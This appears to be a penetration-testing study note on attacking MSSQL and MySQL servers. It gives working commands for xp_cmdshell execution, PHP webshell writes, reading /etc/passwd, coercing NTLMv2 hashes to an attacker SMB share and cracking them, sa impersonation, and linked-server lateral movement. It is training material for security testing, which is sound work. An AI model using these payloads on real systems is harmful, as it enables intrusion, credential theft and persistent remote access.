---
tags: [attack, enumeration/mssql, enumeration/mysql, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---

# Attacking SQL Databases

SQL attack techniques for MSSQL and MySQL: RCE via xp_cmdshell, file read/write, NTLMv2 hash stealing via xp_dirtree, user impersonation, and lateral movement via linked servers.

## Overview

SQL servers are high-value targets: they store credentials and PII, often run as highly-privileged service accounts, and provide built-in mechanisms for OS command execution. MSSQL is particularly powerful for attackers due to xp_cmdshell, linked server traversal, and Windows authentication integration.

See [[enumeration/mssql]] and [[enumeration/mysql]] for pre-attack enumeration.

## Connecting

```bash
# MSSQL from Linux
mssqlclient.py -p 1433 julio@10.129.203.7          # SQL auth
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h   # -h removes headers

# MSSQL from Windows
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

# MySQL from Linux
mysql -u julio -pPassword123 -h 10.129.20.13

# Windows auth on MSSQL (domain account)
sqsh -S 10.129.203.7 -U DOMAIN\\julio -P 'MyPassword!' -h
```

## Command execution (MSSQL: xp_cmdshell)

```sql
-- Execute OS commands
EXEC xp_cmdshell 'whoami';

-- Enable xp_cmdshell if disabled (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

`xp_cmdshell` inherits the SQL Server service account's OS privileges. If running as NT AUTHORITY\SYSTEM, you have full OS access.

## File write (webshell via SELECT INTO OUTFILE)

MySQL only — useful when the DB server also runs a web server:

```sql
-- Check if file writes are permitted
SHOW VARIABLES LIKE "secure_file_priv";
-- Empty value = unrestricted

-- Write PHP webshell to web root
SELECT "<?php echo shell_exec($_GET['c']);?>" 
INTO OUTFILE '/var/www/html/webshell.php';
```

Then access it:

```bash
curl 'http://10.129.203.7/webshell.php?c=id'
```

MSSQL file write via OLE Automation (requires sysadmin):

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT; DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXEC sp_OADestroy @FileID; EXEC sp_OADestroy @OLE;
```

## File read

```sql
-- MSSQL: read any file the service account can access
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;

-- MySQL: LOAD_FILE requires FILE privilege and empty secure_file_priv
SELECT LOAD_FILE('/etc/passwd');
```

## NTLMv2 hash stealing via xp_dirtree

Point `xp_dirtree` or `xp_subdirs` at an attacker-controlled SMB share. The MSSQL service account authenticates via NTLMv2, which you capture with Responder or impacket-smbserver.

```bash
# Start Responder (or impacket-smbserver) on attacker host
sudo responder -I tun0

# Or use impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```

```sql
-- Trigger hash capture from MSSQL
EXEC master..xp_dirtree '\\10.10.110.17\share\';
-- or
EXEC master..xp_subdirs '\\10.10.110.17\share\';
```

Crack the captured NTLMv2 hash:

```bash
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Or relay the hash via impacket-ntlmrelayx (see [[attack/smb]] for relay setup).

## User impersonation (MSSQL IMPERSONATE)

Low-privilege users granted IMPERSONATE can take on sysadmin permissions:

```sql
-- Find who you can impersonate
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Check current privileges
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');

-- Impersonate sa (or any listed user)
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- should return 1

-- Return to original user
REVERT;
```

## Linked server lateral movement

MSSQL can be configured with trusted connections to other database servers. If those remote servers run as sysadmin:

```sql
-- Identify linked servers
SELECT srvname, isremote FROM sysservers;

-- Execute command on linked server
EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')')
AT [10.0.0.12\SQLEXPRESS];

-- If sysadmin on linked server, enable xp_cmdshell there and run commands
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [10.0.0.12\SQLEXPRESS];
```

## Key SQL commands reference

| Task | MySQL | MSSQL |
|------|-------|-------|
| List databases | `SHOW DATABASES;` | `SELECT name FROM master.dbo.sysdatabases; GO` |
| Select database | `USE dbname;` | `USE dbname; GO` |
| List tables | `SHOW TABLES;` | `SELECT table_name FROM INFORMATION_SCHEMA.TABLES; GO` |
| Read all rows | `SELECT * FROM table;` | `SELECT * FROM table; GO` |

## Gotchas & notes

- xp_cmdshell is disabled by default; enabling it requires sysadmin and leaves audit traces
- `secure_file_priv` blocks MySQL file operations unless empty — always check before trying writes
- NTLMv2 relay from MSSQL only works if target has SMB signing disabled (see [[attack/smb]])
- IMPERSONATE privs are session-scoped; after `REVERT`, you lose elevated access
- Linked server execution uses the credentials configured for that link, not your current creds

## Related pages

- [[enumeration/mssql]]
- [[enumeration/mysql]]
- [[tools/impacket]]
- [[tools/crackmapexec]]
- [[tools/responder]]
- [[attack/smb]] — NTLM relay and hash cracking

## Sources

- raw/attacking_common_services/sql_attacking_sql_databases.md
- raw/attacking_common_services/sql_latest_sql_vulnerabilities.md
